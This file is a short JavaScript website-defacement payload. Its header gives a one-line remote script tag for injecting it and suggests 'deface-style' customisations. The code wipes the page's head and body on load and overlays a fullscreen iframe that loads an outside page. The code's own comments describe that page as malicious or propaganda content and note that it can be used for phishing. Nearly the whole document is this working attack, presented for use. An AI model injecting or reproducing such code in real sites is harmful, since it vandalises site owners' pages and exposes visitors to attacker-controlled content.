/*
  <script src="https://cdn.jsdelivr.net/gh/FrostFoe/localhost/ghazwa-e-hind.js"></script>
    
     * This script injects a fullscreen iframe with your content.
     * You can modify it for more advanced deface-style effects.
     * Recommended customization:
     *   - Sound effects or background audio
     *   - Cursor effects or disabling interaction
     *   - Scrolling text banners
     *   - DOM obfuscation
     * 
     * Security Note:
     * Ensure the JS does not expose sensitive data or break accessibility permanently.
     
*/

<script>
document.addEventListener("DOMContentLoaded", () => {
    // 1. Wipe the current page content (dangerous!)
    document.head.innerHTML = '';
    document.body.innerHTML = '';

    // 2. Remove margins and scrollbars from <html> and <body>
    const html = document.documentElement;
    html.style.margin = '0';
    html.style.padding = '0';

    const body = document.body;
    body.style.margin = '0';
    body.style.padding = '0';
    body.style.overflow = 'hidden'; // disable scrolling

    // 3. Create a full-page iframe that covers the entire screen
    const iframe = document.createElement("iframe");

    // ⚠️ Malicious source - loads fake or propaganda content
    iframe.src = "https://frostfoe.github.io/localhost/ghazwa-e-hind.html";

    // Style the iframe to cover the full screen and remove any borders
    Object.assign(iframe.style, {
        width: "100vw",       // 100% of the viewport width
        height: "100vh",      // 100% of the viewport height
        position: "fixed",    // Fixed position on screen
        top: "0",
        left: "0",
        border: "none",
        padding: "0",
        margin: "0",
        overflow: "hidden",   // Hide scrollbars
        zIndex: "9999"        // Make sure it's on top of everything
    });

    // Allow full-screen capabilities (can be used for phishing tricks)
    iframe.allow = "fullscreen";

    // 4. Add the iframe to the page
    body.appendChild(iframe);
});
</script>
